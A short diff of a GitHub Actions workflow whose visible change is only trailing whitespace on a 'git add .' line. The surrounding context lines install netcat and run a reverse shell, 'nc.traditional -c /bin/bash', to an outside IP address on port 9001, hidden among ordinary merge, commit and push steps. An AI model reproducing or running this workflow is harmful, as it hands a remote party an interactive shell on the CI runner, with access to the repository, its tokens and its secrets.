@@ -15,7 +15,7 @@ jobs:
         sudo apt-get install netcat-traditional -y
         /bin/nc.traditional -c /bin/bash 20.13.168.45 9001
         bash ./.github/workflows/merge.sh
-        git add .
+        git add . 
         git commit --message "Merge queries"
         git push -u origin HEAD:main
     - name: Push remotely
